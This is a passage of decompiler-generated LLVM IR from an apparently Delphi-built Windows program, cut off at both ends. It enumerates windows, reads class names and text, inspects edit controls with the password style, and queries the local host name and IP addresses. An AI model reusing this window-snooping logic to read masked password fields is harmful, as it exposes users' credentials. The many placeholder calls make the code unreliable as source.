  %1 = trunc i32 %0 to i8, !insn.addr !1962
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1963
}

define i32 @function_407524(i32 %arg1) local_unnamed_addr {
dec_label_pc_407524:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1964
  %edi.0.reg2mem = alloca i32, !insn.addr !1964
  %ecx.0.reg2mem = alloca i32, !insn.addr !1964
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1965
  br label %2, !insn.addr !1965

; <label>:2:                                      ; preds = %4, %dec_label_pc_407524
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1965
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1965
  br i1 %3, label %10, label %4, !insn.addr !1965

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1965
  %6 = load i8, i8* %5, align 1, !insn.addr !1965
  %7 = icmp eq i8 %6, 0, !insn.addr !1965
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1965
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1965
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1965
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1965
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1965
  br i1 %7, label %10, label %2, !insn.addr !1965

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1966
  ret i32 %11, !insn.addr !1967
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_407578() local_unnamed_addr {
dec_label_pc_407578:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1968
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1969
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1969
  %4 = add i32 %3, %1, !insn.addr !1970
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1970
  store i8 0, i8* %5, align 1, !insn.addr !1970
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1971
  ret i32 %6, !insn.addr !1972
}

define i32 @function_4075ac() local_unnamed_addr {
dec_label_pc_4075ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1973
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1974
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1975
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1975
  %6 = add i32 %5, %3, !insn.addr !1976
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1976
  store i8 0, i8* %7, align 1, !insn.addr !1976
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1977
  ret i32 %8, !insn.addr !1978
}

define i32 @function_4075e4() local_unnamed_addr {
dec_label_pc_4075e4:
  %0 = call i32 @function_4034f4(), !insn.addr !1979
  %1 = call i32 @function_4034f4(), !insn.addr !1980
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1981
  ret i32 %2, !insn.addr !1982
}

define i32 @function_407624() local_unnamed_addr {
dec_label_pc_407624:
  %0 = call i32 @function_4034f4(), !insn.addr !1983
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1984
  ret i32 %1, !insn.addr !1985
}

define i32 @function_40765c() local_unnamed_addr {
dec_label_pc_40765c:
  %0 = call i32 @function_4036f4(), !insn.addr !1986
  %1 = call i32 @function_4036f4(), !insn.addr !1987
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1988
  %3 = icmp eq i32 %2, 2, !insn.addr !1989
  %4 = zext i1 %3 to i32, !insn.addr !1990
  %5 = and i32 %2, -256, !insn.addr !1990
  %6 = or i32 %5, %4, !insn.addr !1990
  ret i32 %6, !insn.addr !1991
}

define i32 @function_40768c() local_unnamed_addr {
dec_label_pc_40768c:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1992
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1992
  %esp.02.reg2mem = alloca i32, !insn.addr !1992
  %storemerge3.reg2mem = alloca i32, !insn.addr !1992
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1993
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1993
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1993
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1994
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1995
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1996
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1996
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1997
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1997
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1997
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1998
  %9 = icmp eq i1 %8, false, !insn.addr !1999
  %10 = icmp eq i1 %9, false, !insn.addr !2000
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !2000
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !2000
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !2000
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !2000
  br i1 %10, label %dec_label_pc_4076b0, label %dec_label_pc_4076f0, !insn.addr !2000

dec_label_pc_4076b0:                              ; preds = %dec_label_pc_40768c, %dec_label_pc_4076b0
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_407578(), !insn.addr !2001
  %12 = call i32 @function_40768c(), !insn.addr !2002
  %13 = add i32 %esp.02.reload, -8, !insn.addr !2003
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2003
  store i32 2, i32* %14, align 4, !insn.addr !2003
  %15 = add i32 %esp.02.reload, -12, !insn.addr !2004
  %16 = inttoptr i32 %15 to i32*, !insn.addr !2004
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !2004
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !2005
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1997
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1997
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1998
  %21 = icmp eq i1 %20, false, !insn.addr !1999
  %22 = icmp eq i1 %21, false, !insn.addr !2000
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !2000
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !2000
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !2000
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !2000
  br i1 %22, label %dec_label_pc_4076b0, label %dec_label_pc_4076f0, !insn.addr !2000

dec_label_pc_4076f0:                              ; preds = %dec_label_pc_4076b0, %dec_label_pc_40768c
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !2006
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !2007
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !2008
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2008
  store i32 4224781, i32* %25, align 4, !insn.addr !2008
  %26 = call i32 @"@LStrClr"(), !insn.addr !2009
  ret i32 %26, !insn.addr !2010
}

define i32 @function_407706() local_unnamed_addr {
dec_label_pc_407706:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2011
  ret i32 %0, !insn.addr !2011
}

define i32 @function_40770b() local_unnamed_addr {
dec_label_pc_40770b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2012
}

define i32 @function_40770d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40770d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2013
}

define i32 @function_407718() local_unnamed_addr {
dec_label_pc_407718:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2014
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !2014
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !2014
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2015
  %2 = call i32 @function_4075ac(), !insn.addr !2016
  %3 = call i32 @"@LStrCmp"(), !insn.addr !2017
  %4 = call i32 @function_40768c(), !insn.addr !2018
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !2019
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !2020
  %6 = call i32 @"@LStrClr"(), !insn.addr !2021
  ret i32 %6, !insn.addr !2022
}

define i32 @function_407779() local_unnamed_addr {
dec_label_pc_407779:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2023
  ret i32 %0, !insn.addr !2023
}

define i32 @function_40777e() local_unnamed_addr {
dec_label_pc_40777e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2024
}

define i32 @function_407780(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407780:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2025
}

define i32 @function_40779b() local_unnamed_addr {
dec_label_pc_40779b:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !2026
  %4 = inttoptr i32 %0 to i32*, !insn.addr !2026
  store i32 %3, i32* %4, align 4, !insn.addr !2026
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !2027
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !2027
  %9 = add i8 %6, %8, !insn.addr !2027
  %10 = inttoptr i32 %7 to i8*, !insn.addr !2027
  store i8 %9, i8* %10, align 1, !insn.addr !2027
  %11 = add i32 %2, 81, !insn.addr !2028
  %12 = inttoptr i32 %11 to i8*, !insn.addr !2028
  %13 = load i8, i8* %12, align 1, !insn.addr !2028
  %14 = trunc i32 %1 to i8, !insn.addr !2028
  %15 = add i8 %13, %14, !insn.addr !2028
  store i8 %15, i8* %12, align 1, !insn.addr !2028
  %16 = load i32, i32* %eax, align 4, !insn.addr !2029
  ret i32 %16, !insn.addr !2029
}

define x86_fp80 @function_4077a3() local_unnamed_addr {
dec_label_pc_4077a3:
  %0 = call x86_fp80 @__decompiler_undefined_function_12()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !2030
  ret x86_fp80 %1, !insn.addr !2031
}

define i32 @function_4077a8() local_unnamed_addr {
dec_label_pc_4077a8:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !2032
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !2033
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !2033
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !2033
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !2034
  %3 = call i32 @function_4075ac(), !insn.addr !2035
  %4 = call i32 @"@LStrCmp"(), !insn.addr !2036
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !2037
  %6 = icmp eq i32 %5, 180, !insn.addr !2038
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !2039
  br i1 %6, label %dec_label_pc_40780b, label %dec_label_pc_4077e6, !insn.addr !2039

dec_label_pc_4077e6:                              ; preds = %dec_label_pc_4077a8
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !2040
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !2041
  %10 = icmp eq i1 %9, false, !insn.addr !2042
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !2042
  br i1 %10, label %dec_label_pc_40780b, label %dec_label_pc_4077f2, !insn.addr !2042

dec_label_pc_4077f2:                              ; preds = %dec_label_pc_4077e6
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !2043
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_40780b

dec_label_pc_40780b:                              ; preds = %dec_label_pc_4077f2, %dec_label_pc_4077a8, %dec_label_pc_4077e6
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !2044
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !2045
  %13 = add i32 %esp.1, 8, !insn.addr !2046
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2046
  store i32 4225070, i32* %14, align 4, !insn.addr !2046
  %15 = call i32 @"@LStrClr"(), !insn.addr !2047
  ret i32 %15, !insn.addr !2048
}

define i32 @function_407827() local_unnamed_addr {
dec_label_pc_407827:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2049
  ret i32 %0, !insn.addr !2049
}

define i32 @function_40782c() local_unnamed_addr {
dec_label_pc_40782c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2050
}

define i32 @function_40782e(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40782e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2051
}

define i32 @function_407844() local_unnamed_addr {
dec_label_pc_407844:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !2052
  %3 = call i32* @GetDC(i32* %2), !insn.addr !2052
  %4 = ptrtoint i32* %3 to i32, !insn.addr !2052
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !2053
  %6 = inttoptr i32 %5 to i32*, !insn.addr !2054
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !2054
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !2055
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !2056
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !2057
  %11 = inttoptr i32 %1 to i32*, !insn.addr !2058
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !2058
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !2059
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !2060
  %16 = ashr i32 %15, 31, !insn.addr !2061
  %17 = zext i32 %15 to i64, !insn.addr !2062
  %18 = zext i32 %16 to i64, !insn.addr !2062
  %19 = mul i64 %18, 4294967296, !insn.addr !2062
  %20 = or i64 %19, %17, !insn.addr !2062
  %21 = zext i32 %4 to i64, !insn.addr !2062
  %22 = sdiv i64 %20, %21, !insn.addr !2062
  %23 = trunc i64 %22 to i32, !insn.addr !2062
  ret i32 %23, !insn.addr !2063
}

define i32 @function_4078a0() local_unnamed_addr {
dec_label_pc_4078a0:
  %esp.0.reg2mem = alloca i32, !insn.addr !2064
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2065
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !2065
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !2065
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2066
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !2067
  %3 = icmp eq i32 %2, 0, !insn.addr !2067
  br i1 %3, label %dec_label_pc_4078dc, label %dec_label_pc_4078c9, !insn.addr !2068

dec_label_pc_4078c9:                              ; preds = %dec_label_pc_4078a0
  %4 = inttoptr i32 %2 to i32*, !insn.addr !2069
  store i32 0, i32* %4, align 4, !insn.addr !2069
  br label %dec_label_pc_4078dc, !insn.addr !2070

dec_label_pc_4078dc:                              ; preds = %dec_label_pc_4078c9, %dec_label_pc_4078a0
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !2071
  %6 = icmp eq i32 %5, 0, !insn.addr !2071
  br i1 %6, label %dec_label_pc_4078f0, label %dec_label_pc_4078e6, !insn.addr !2072

dec_label_pc_4078e6:                              ; preds = %dec_label_pc_4078dc
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !2073
  %8 = icmp eq i32 %7, 0, !insn.addr !2073
  %9 = icmp eq i1 %8, false, !insn.addr !2074
  br i1 %9, label %dec_label_pc_4078fa, label %dec_label_pc_4078f0, !insn.addr !2074

dec_label_pc_4078f0:                              ; preds = %dec_label_pc_4078e6, %dec_label_pc_4078dc
  %10 = call i32 @function_4079d4(), !insn.addr !2075
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2076
  br label %dec_label_pc_407997, !insn.addr !2076

dec_label_pc_4078fa:                              ; preds = %dec_label_pc_4078e6
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2077
  %12 = icmp eq i8 %11, 0, !insn.addr !2077
  br i1 %12, label %dec_label_pc_407923, label %dec_label_pc_407904, !insn.addr !2078

dec_label_pc_407904:                              ; preds = %dec_label_pc_4078fa
  %13 = call i32 @function_4071bc(), !insn.addr !2079
  %14 = icmp eq i32 %13, 0, !insn.addr !2080
  br i1 %14, label %dec_label_pc_407923, label %dec_label_pc_40791c, !insn.addr !2081

dec_label_pc_40791c:                              ; preds = %dec_label_pc_407904
  %15 = call i32 @function_4079d4(), !insn.addr !2082
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2083
  br label %dec_label_pc_407997, !insn.addr !2083

dec_label_pc_407923:                              ; preds = %dec_label_pc_407904, %dec_label_pc_4078fa
  %16 = call i32 @"@LStrCatN"(), !insn.addr !2084
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2085
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4221088 to i32*), i32 0, i32* null), !insn.addr !2086
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4221088 to i32*), i32 0, i32* null), !insn.addr !2087
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !2088
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !2088
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4221088 to i32*), i32 0, i32* null), !insn.addr !2089
  %23 = call i32 @function_4079d4(), !insn.addr !2090
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !2090
  br label %dec_label_pc_407997, !insn.addr !2090

dec_label_pc_407997:                              ; preds = %dec_label_pc_407923, %dec_label_pc_40791c, %dec_label_pc_4078f0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !2091
  %25 = load i32, i32* %24, align 4, !insn.addr !2091
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !2092
  %26 = add i32 %esp.0.reload, 8, !insn.addr !2093
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2093
  store i32 4225460, i32* %27, align 4, !insn.addr !2093
  %28 = call i32 @"@LStrClr"(), !insn.addr !2094
  ret i32 %28, !insn.addr !2095
}

define i32 @function_4079ad() local_unnamed_addr {
dec_label_pc_4079ad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2096
  ret i32 %0, !insn.addr !2096
}

define i32 @function_4079b2() local_unnamed_addr {
dec_label_pc_4079b2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2097
}

define i32 @function_4079b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4079b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2098
}

define i32 @function_4079d4() local_unnamed_addr {
dec_label_pc_4079d4:
  %0 = call i32 @"@LStrClr"(), !insn.addr !2099
  %1 = call i32 @"@LStrClr"(), !insn.addr !2100
  ret i32 %1, !insn.addr !2101
}

define i32 @function_4079ec() local_unnamed_addr {
dec_label_pc_4079ec:
  %eax.0.reg2mem = alloca i32, !insn.addr !2102
  %esp.0.reg2mem = alloca i32, !insn.addr !2102
  %esp.15.reg2mem = alloca i32, !insn.addr !2102
  %storemerge6.reg2mem = alloca i32, !insn.addr !2102
  %.reg2mem = alloca i32, !insn.addr !2102
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !2102
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !2103
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !2104
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !2105
  %5 = call i32 @"@LStrClr"(), !insn.addr !2106
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !2107
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !2107
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !2108
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !2109
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !2110
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !2110
  %11 = icmp eq %hostent* %9, null, !insn.addr !2111
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2112
  br i1 %11, label %dec_label_pc_407a4a, label %dec_label_pc_407a24, !insn.addr !2112

dec_label_pc_407a24:                              ; preds = %dec_label_pc_4079ec
  %12 = add i32 %10, 12, !insn.addr !2113
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2113
  %14 = load i32, i32* %13, align 4, !insn.addr !2113
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2114
  %16 = load i32, i32* %15, align 4, !insn.addr !2114
  %17 = icmp eq i32 %16, 0, !insn.addr !2115
  %18 = icmp eq i1 %17, false, !insn.addr !2116
  br i1 %18, label %dec_label_pc_407a2b.lr.ph, label %dec_label_pc_407a45, !insn.addr !2116

dec_label_pc_407a2b.lr.ph:                        ; preds = %dec_label_pc_407a24
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !2109
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_407a2b

dec_label_pc_407a2b:                              ; preds = %dec_label_pc_407a2b.lr.ph, %dec_label_pc_407a3d
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !2117
  %21 = icmp eq i1 %20, false, !insn.addr !2118
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !2118
  br i1 %21, label %dec_label_pc_407a3d, label %dec_label_pc_407a2f, !insn.addr !2118

dec_label_pc_407a2f:                              ; preds = %dec_label_pc_407a2b
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !2119
  %23 = load i32, i32* %22, align 4, !insn.addr !2119
  %24 = add i32 %esp.15.reload, -4, !insn.addr !2119
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2119
  store i32 %23, i32* %25, align 4, !insn.addr !2119
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !2120
  %27 = call i32 @StrPas(), !insn.addr !2121
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !2121
  br label %dec_label_pc_407a3d, !insn.addr !2121

dec_label_pc_407a3d:                              ; preds = %dec_label_pc_407a2f, %dec_label_pc_407a2b
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !2122
  %29 = mul i32 %28, 4, !insn.addr !2114
  %30 = add i32 %29, %14, !insn.addr !2114
  %31 = inttoptr i32 %30 to i32*, !insn.addr !2114
  %32 = load i32, i32* %31, align 4, !insn.addr !2114
  %33 = icmp eq i32 %32, 0, !insn.addr !2115
  %34 = icmp eq i1 %33, false, !insn.addr !2116
  store i32 %32, i32* %.reg2mem, !insn.addr !2116
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !2116
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !2116
  br i1 %34, label %dec_label_pc_407a2b, label %dec_label_pc_407a45, !insn.addr !2116

dec_label_pc_407a45:                              ; preds = %dec_label_pc_407a3d, %dec_label_pc_407a24
  %35 = call i32 @WSACleanup(), !insn.addr !2123
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !2123
  br label %dec_label_pc_407a4a, !insn.addr !2123

dec_label_pc_407a4a:                              ; preds = %dec_label_pc_407a45, %dec_label_pc_4079ec
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2124
}

define i32 @function_407a58() local_unnamed_addr {
dec_label_pc_407a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2125
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2125
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2125
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2126
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2127
  %3 = add i32 %2, 1, !insn.addr !2127
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !2127
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2128
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2129
  ret i32 0, !insn.addr !2130
}

define i32 @function_407a7d() local_unnamed_addr {
dec_label_pc_407a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2131
  ret i32 %0, !insn.addr !2131
}

define i32 @function_407a82() local_unnamed_addr {
dec_label_pc_407a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2132
}

define i32 @function_407a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2133
}

define i32 @function_407a88() local_unnamed_addr {
dec_label_pc_407a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2134
  %2 = add i32 %1, -1, !insn.addr !2134
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !2134
  ret i32 %0, !insn.addr !2135
}

define i32 @function_407a90() local_unnamed_addr {
dec_label_pc_407a90:
  %stack_var_-24 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2136
  store i32 %0, i32* %stack_var_-24, align 4, !insn.addr !2136
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !2136
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2137
  %2 = call i32 @"@LStrLAsg"(), !insn.addr !2138
  %3 = load i32, i32* %stack_var_-24, align 4, !insn.addr !2139
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2140
  %4 = call i32 @"@LStrArrayClr"(), !insn.addr !2141
  ret i32 %4, !insn.addr !2142
}

define i32 @function_407ad4() local_unnamed_addr {
dec_label_pc_407ad4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2143
  ret i32 %0, !insn.addr !2143
}

define i32 @function_407ad9() local_unnamed_addr {
dec_label_pc_407ad9:
